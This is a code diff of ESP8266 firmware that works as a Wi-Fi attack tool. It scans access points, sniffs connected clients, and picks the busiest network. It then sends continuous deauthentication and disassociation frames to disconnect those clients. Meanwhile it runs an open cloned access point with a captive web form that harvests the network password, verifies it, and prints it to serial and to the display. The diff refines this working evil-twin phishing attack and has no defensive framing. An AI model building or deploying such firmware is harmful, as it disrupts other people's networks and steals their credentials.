@@ -1,4 +1,4 @@
-   
+
 #include <DNSServer.h>
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
@@ -6,7 +6,7 @@
 #include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
 
 extern "C" {
-  #include "user_interface.h"
+#include "user_interface.h"
 }
 
 #define MODE_SCAN_APS 0
@@ -36,18 +36,8 @@ int iChannels[maxAPs];
 char capNames[maxAPs][33];
 int iap = 0;
 /*---------------------------------------*/
-void apScan() {
-  int x = 0;
-  int results = WiFi.scanNetworks(false, true);
-  for (int i = 0; i < results; i++) {
-    Serial.println(">AP: " + WiFi.SSID(i));
-    for (int j = 0; j < 6; j++) iapMac[x][j] = WiFi.BSSID(i)[j];
-    iChannels[x] = WiFi.channel(i);
-    String _ssid = WiFi.SSID(i);
-    _ssid.toCharArray(capNames[x], 33);
-    if (isalnum(capNames[x][0])) x++;
-    if (x >= maxAPs) return;
-  }
+void macCpy(uint8_t* tMac, uint8_t* fMac) {
+  for (int i = 0; i < 6; i++) tMac[i] = fMac[i];
 }
 /*---------------------------------------*/
 bool macCmp(uint8_t* fMac, uint8_t* tMac) {
@@ -57,6 +47,22 @@ bool macCmp(uint8_t* fMac, uint8_t* tMac) {
   return true;
 }
 /*---------------------------------------*/
+void apScan() {
+  int x = 0;
+  int results = WiFi.scanNetworks(false, true);
+  for (int i = 0; i < results; i++) {
+    const char *cssid = WiFi.SSID(i).c_str();
+    if (isalnum(cssid[0])) {
+      Serial.println(">>>AP: " + WiFi.SSID(i));
+      macCpy(iapMac[x], WiFi.BSSID(i));
+      iChannels[x] = WiFi.channel(i);
+      String _ssid = WiFi.SSID(i);
+      _ssid.toCharArray(capNames[x], 33);
+      if (x++ >= (maxAPs - 1)) return;
+    }
+  }
+}
+/*---------------------------------------*/
 void sniffer(uint8_t* buf, uint16_t len) {
   if (varMode != MODE_SCAN_STA) return;
   if ((buf[12] == 0xc0) || (buf[12] == 0xa0)) return;
@@ -64,32 +70,41 @@ void sniffer(uint8_t* buf, uint16_t len) {
   if (macCmp(broadcast, buf + 16) || macCmp(broadcast, buf + 22)) return;
   for (int i = 0; i < maxAPs; i++) {
     if (macCmp(iapMac[i], buf + 16)) {
-      if (iapc[i] >= maxSTAs) return;
+      if (iapc[i] > maxSTAs) return;
       for (int x = 0; x < iapc[i]; x++) {
         if (macCmp(istMac[i][x], buf + 22)) return;
       }
-      for (int x = 0; x < 6; x++) {
-        istMac[i][iapc[i]][x] = buf[22 + x];
-      }
+      macCpy(istMac[i][iapc[i]], buf + 22);
       Serial.print(">>>ST: " + String(capNames[i]) + " >>> ");
       for (int j = 0; j < 6; j++) Serial.print(String(istMac[i][iapc[i]][j]) + ".");
       Serial.println();
       iapc[i]++;
     }
     if (macCmp(iapMac[i], buf + 22)) {
-      if (iapc[i] >= maxSTAs) return;
+      if (iapc[i] > maxSTAs) return;
       for (int x = 0; x < iapc[i]; x++) {
         if (macCmp(istMac[i][x], buf + 16)) return;
       }
-      for (int x = 0; x < 6; x++) {
-        istMac[i][iapc[i]][x] = buf[16 + x];
-      }
+      macCpy(istMac[i][iapc[i]], buf + 16);
       Serial.print(">>>ST: " + String(capNames[i]) + " >>> ");
       for (int j = 0; j < 6; j++) Serial.print(String(istMac[i][iapc[i]][j]) + ".");
       Serial.println();
       iapc[i]++;
     }
   }
+}
+/*---------------------------------------*/
+void selectMaxAP() {
+  int maxValue = 0; iap = 0;
+  for (int i = 0; i < maxAPs; i++) {
+    Serial.println(">>>" + String(capNames[i]) + "> " + String(iapc[i]));
+    if (iapc[i] > maxValue) {
+      maxValue = iapc[i];
+      iap = i;
+    }
+  }
+  displayAP = String(capNames[iap]);
+  Serial.println(">>>Selected AP: " + String(capNames[iap]) + String(maxValue));
 }
 
 /*=====================================================================*/
@@ -123,33 +138,44 @@ uint8_t deauthPacket[26] = {
   /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
   /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
 };
+uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+uint8_t stMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+/*-------------------------------------------------------------------*/
+void sendPacket(uint8_t type) {
+  int tSize = 0;
+  uint8_t tPacket[128];
+  for (int i = 0; i < sizeof(deauthPacket); i++) {
+    tPacket[i] = deauthPacket[i];
+    tSize++;
+  }
+  for (int i = 0; i < 6; i++) {
+    tPacket[4 + i] = stMac[i]; 
+    tPacket[10 + i] = tPacket[16 + i] = apMac[i];
+  }
+  tPacket[0] = type;
+  tPacket[24] = 0x01;
+  if (wifi_send_pkt_freedom(tPacket, tSize, 0) == -1) {
+    Serial.print("-");
+  } else {
+    Serial.print("+");
+  }
+  delay(2); //less packets are beeing dropped
+}
 /*---------------------------------------------------------------------*/
 void sendDeauth(int iNum) {
-  int packetSize = sizeof(deauthPacket);
   for (int i = 0; i < maxSTAs; i++) {
     if (i >= iapc[iNum]) return;
     //-------------------------------------------------------------------
-    for (int x = 0; x < 6; x++) {
-      deauthPacket[4 + x] = istMac[iNum][i][x];
-      deauthPacket[10 + x] = iapMac[iNum][x];
-      deauthPacket[16 + x] = iapMac[iNum][x];
-    }
-    deauthPacket[0] = 0xc0;
-    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
-    deauthPacket[0] = 0xa0;
-    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
+    macCpy(stMac, istMac[iNum][i]);
+    macCpy(apMac, iapMac[iNum]);
+    sendPacket(0xc0);
+    sendPacket(0xa0);
     //-------------------------------------------------------------------
-    for (int x = 0; x < 6; x++) {
-      deauthPacket[4 + x] = iapMac[iNum][x];
-      deauthPacket[10 + x] = istMac[iNum][i][x];
-      deauthPacket[16 + x] = istMac[iNum][i][x];
-    }
-    deauthPacket[0] = 0xc0;
-    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
-    deauthPacket[0] = 0xa0;
-    if (wifi_send_pkt_freedom(deauthPacket, packetSize, 0) == -1) Serial.print("-");
+    macCpy(apMac, istMac[iNum][i]);
+    macCpy(stMac, iapMac[iNum]);
+    sendPacket(0xc0);
+    sendPacket(0xa0);
   }
-  delay(2); //less packets are beeing dropped
 }
 
 /*=====================================================================*/
@@ -173,23 +199,22 @@ void handleForm() {
   } else {
     if (webServer.hasArg("pwd")) {
       webServer.send(200, "text/json", "true" );
+      varMode = MODE_OTHER_SS;
       WiFi.mode(WIFI_STA);
       WiFi.begin((const char*)capNames[iap], (const char*)webServer.arg("pwd").c_str());
-      displayAP = capNames[iap];
+      displayAP = String(capNames[iap]);
       displayPWD = webServer.arg("pwd");
       int count = 0;
-      while (WiFi.status() != WL_CONNECTED && count++ < 10) {
-        delay(1000);
-      }
+      while (WiFi.status() != WL_CONNECTED && count++ < 10) delay(1000);
       if (count >= 10) {
         WiFi.mode(WIFI_AP);
         WiFi.softAP((const char*)capNames[iap], (const char*)"", iChannels[iap]);
+        varMode = MODE_DEAUTHER;
         displayMSG = "pwd is not ok!!!";
       } else {
         Serial.println("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
         Serial.println(capNames[iap] + String("==>>") + webServer.arg("pwd"));
         displayMSG = "pwd is ok!!!";
-        varMode = MODE_OTHER_SS;
       }
     } else webServer.send(200, "text/json", "false");
   }
@@ -211,6 +236,7 @@ void setup() {
     sniffer(buf, len);
   });
   varMode = MODE_SCAN_APS;
+  displayMSG = "SCAN_APS Start..";
   Serial.println("@@@setup@@@setup@@@setup@@@");
 }
 
@@ -231,17 +257,18 @@ void loop() {
       wifi_promiscuous_enable(true);
       snifferStartTime = millis();
       varMode = MODE_SCAN_STA;
+      displayMSG = "SCAN_APS Over!";
       Serial.println("@@@MODE_SCAN_APS is Over!!!!!!");
       break;
     //==============================================================
     case MODE_SCAN_STA:
-      if (currentTime > snifferStartTime + 15000) {
+      if (currentTime > snifferStartTime + 60000) {
         wifi_promiscuous_enable(false);
         if (iap++ >= maxAPs) {
-          iap = 0;
+          selectMaxAP();
           startOpenAP(iap);
-          deauthStartTime = millis();
           varMode = MODE_DEAUTHER;
+          displayMSG = "SCAN_STA Over!";
           Serial.println("@@@MODE_SCAN_STA is Over!!!!!!");
           break;
         }
@@ -249,29 +276,19 @@ void loop() {
         wifi_promiscuous_enable(true);
         snifferStartTime = currentTime;
       }
+      displayMSG = "SCAN_STA Start..";
       break;
     //==============================================================
     case MODE_DEAUTHER:
       webServer.handleClient();
       dnsServer.processNextRequest();
-      if (iapc[iap] == 0) iap++;
-      if (currentTime > deauthStartTime + 60000) {
-        if (iap++ >= maxAPs) {
-          iap = 0;
-          varMode = MODE_SCAN_STA;
-          snifferStartTime = millis();
-          Serial.println("@@@MODE_DEAUTHER is Over!!!!!!");
-          break;
-        }
-        startOpenAP(iap);
-        deauthStartTime = millis();
-      } else {
-        sendDeauth(iap);
-      }
+      sendDeauth(iap);
+      displayMSG = "Attacking......";
       break;
     //==============================================================
     default:
       Serial.println("varMode = " + varMode);
+      delay(300);
       break;
   }
   display.clear();
@@ -282,4 +299,4 @@ void loop() {
   display.drawString(10, 50, displayMSG);
   display.display();
   delay(30);
-} 
+}
